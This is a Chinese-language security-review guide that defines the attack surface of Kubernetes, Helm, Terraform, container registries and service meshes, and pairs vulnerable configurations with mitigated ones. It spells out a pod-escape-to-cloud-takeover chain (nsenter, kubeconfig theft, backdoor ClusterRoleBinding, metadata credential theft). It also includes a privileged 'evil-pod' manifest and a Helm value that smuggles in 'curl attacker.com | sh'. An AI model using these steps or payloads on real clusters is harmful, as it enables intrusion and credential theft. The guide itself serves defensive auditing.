---
description: 定义基础设施攻击面，覆盖K8s API、Controller Webhook、Helm Chart、Terraform模块、容器仓库与服务网格。
tags: [infra, kubernetes, attack-surface, cloud-native]
---

# 基础设施攻击面定义 (Target Definer)

## 1. 专家直觉触发器 (Triggers)

当专家审查基础设施时，以下信号会立即拉响警报：

- **K8s API Server 暴露**：`kubectl` 或 REST API 直接暴露于公网，且缺乏 IP 白名单或强认证。
- **Controller Webhook 无认证**：`MutatingWebhookConfiguration` 或 `ValidatingWebhookConfiguration` 的 `clientConfig.url` 指向外部地址，且未配置 `caBundle` 或 TLS 校验。
- **Helm Chart 来源不可信**：`requirements.yaml` 或 `Chart.yaml` 依赖来自公共仓库或未经签名的 tar 包。
- **Terraform 模块拉取策略宽松**：使用 `source = "github.com/..."` 指向任意仓库，且未锁定版本或校验哈希。
- **容器仓库缺乏签名验证**：镜像拉取策略为 `IfNotPresent`，且未启用 `cosign` 或 `Notary` 签名检查。
- **Service Mesh mTLS 未强制**：`PeerAuthentication` 或 `DestinationRule` 中 `mtls.mode` 为 `PERMISSIVE` 或 `DISABLE`。

这些触发器意味着攻击者可能通过低权限入口逐步接管整个集群乃至底层云账户。

## 2. 不可跳过的问题链 (Question Chain)

在进入深度分析前，必须依次回答以下问题，跳过任何一步都会导致盲区：

1. **谁能与 API Server 通信？**  
   是否所有命名空间用户都能创建 Pod？Webhook 的 `rules` 范围是否过于宽泛？
2. **Controller 的输入边界在哪里？**  
   用户可控的字段（如 annotation、label、spec 字段）是否会进入 Controller 的 reconcile 逻辑或外部命令？
3. **Helm/Terraform 的渲染上下文是否隔离？**  
   `values.yaml` 中的字符串是否会被直接注入 Go Template 或 Terraform `templatefile()` 函数？
4. **Pod 创建时是否强制执行安全策略？**  
   是否存在 `PodSecurityPolicy`（或 `Pod Security Standards`）？`securityContext` 是否允许 `privileged`、`runAsRoot`、`hostPath`？
5. **集群内是否能访问云元数据服务？**  
   从任意 Pod 是否能访问 `169.254.169.254`？节点 IAM 角色是否过度授权？
6. **供应链上的每一次传递是否可验证？**  
   镜像、Chart、模块在拉取时是否做了哈希或签名校验？是否有 SBOM？

## 3. 攻击链闭合 (Attack Chain Closure)

基础设施漏洞的完整攻击链必须逻辑自洽，以下是一条典型的从低权限到云账户接管的路径：

**前提**：攻击者拥有某个命名空间的 `edit` 角色，可以创建 Pod 和 ConfigMap。

**步骤 1（权限探测）**：攻击者使用 `kubectl auth can-i --list` 发现当前角色允许创建 `pods` 和 `pods/exec`。
**步骤 2（Payload 投递）**：构造一个包含 `hostPath` 挂载到 `/root/.ssh` 且 `hostPID: true` 的恶意 Pod YAML，通过 `kubectl apply` 下发。
**步骤 3（沙箱逃逸）**：Pod 启动后，由于共享宿主 PID 命名空间且挂载了宿主文件系统，攻击者在容器内 `nsenter -t 1 -m -u -i -n` 进入宿主命名空间，获得 Node 权限。
**步骤 4（横向移动）**：在节点上读取 `/var/lib/kubelet/kubeconfig`，获取集群证书，进而以 Node 身份访问 API Server。
**步骤 5（集群接管）**：利用集群-admin 绑定或 webhook 配置，创建后门 `ClusterRoleBinding`，赋予自身 `cluster-admin`。
**步骤 6（云元数据窃取）**：从节点或特权 Pod 访问 `169.254.169.254/latest/meta-data/iam/security-credentials/`，窃取节点 IAM 临时凭证。
**步骤 7（云账户接管）**：使用 IAM 凭证调用云厂商 API，访问 S3、EC2、STS，甚至修改其他集群的托管配置。

**逻辑闭环**：如果攻击者能创建未受安全策略约束的 Pod，则必然存在一条从命名空间到节点、再到集群、最后到云账户的完整路径。因此，**Pod 创建权限 + 缺乏安全策略 = 集群毁灭**。

## 4. 代码示例 (Code Examples)

### 4.1 危险的 Pod 安全上下文（漏洞模式）

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: evil-pod
spec:
  hostPID: true
  hostNetwork: true
  containers:
  - name: app
    image: alpine
    securityContext:
      privileged: true
      runAsUser: 0
    volumeMounts:
    - name: host-root
      mountPath: /host
  volumes:
  - name: host-root
    hostPath:
      path: /
      type: Directory
```

**风险**：`privileged: true` 配合 `hostPID` 和 `hostPath` 直接等价于在宿主上以 root 运行。

### 4.2 相对安全的 Pod 安全上下文（缓解模式）

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: safe-pod
spec:
  securityContext:
    runAsNonRoot: true
    seccompProfile:
      type: RuntimeDefault
  containers:
  - name: app
    image: alpine
    securityContext:
      allowPrivilegeEscalation: false
      readOnlyRootFilesystem: true
      capabilities:
        drop: ["ALL"]
    volumeMounts:
    - name: data
      mountPath: /data
  volumes:
  - name: data
    emptyDir: {}
```

**缓解**：通过 `runAsNonRoot`、`drop ALL capabilities`、`readOnlyRootFilesystem` 和 `emptyDir` 消除逃逸面。

### 4.3 不安全的 Helm Values 注入（漏洞模式）

```yaml
# values.yaml (由用户控制)
image:
  repository: nginx
  tag: "latest; curl attacker.com | sh"

# deployment.yaml (模板)
spec:
  template:
    spec:
      containers:
      - name: {{ .Values.image.repository }}
        image: "{{ .Values.image.repository }}:{{ .Values.image.tag }}"
```

**风险**：如果 `tag` 未经 `quote` 或 `default` 过滤，可能破坏 YAML 结构或注入命令。虽然此处是镜像字符串，但在某些模板上下文中（如环境变量）会导致命令注入。

### 4.4 安全的 Helm 模板渲染（缓解模式）

```yaml
# deployment.yaml
spec:
  template:
    spec:
      containers:
      - name: {{ .Values.image.repository | quote }}
        image: {{ printf "%s:%s" .Values.image.repository .Values.image.tag | quote }}
```

**缓解**：始终使用管道 `quote` 或 `printf` 对字符串进行转义，防止模板注入导致 YAML 结构破坏。

## 5. 攻击面优先级排序

在实际评估中，专家会按以下优先级排序攻击面：

1. **P0：直接暴露的 K8s API Server 与未认证 Webhook** — 无需任何内部权限即可探测或利用。
2. **P1：低权限用户可创建的特权 Pod 路径** — 仅需命名空间 edit 角色即可尝试节点逃逸。
3. **P2：Helm/Terraform 供应链污染** — 需要控制仓库或提交 PR，但影响范围极广。
4. **P3：Service Mesh 的 mTLS 旁路** — 通常需要已在集群内，用于横向移动而非初始入口。
5. **P4：容器镜像签名缺失** — 属于长期风险，需结合其他漏洞才能武器化。

**说明**：该优先级帮助安全团队将有限资源投入到最具破坏力的入口点。P0 和 P1 问题应在发现后立即修复，P2-P4 可纳入长期安全基线计划。
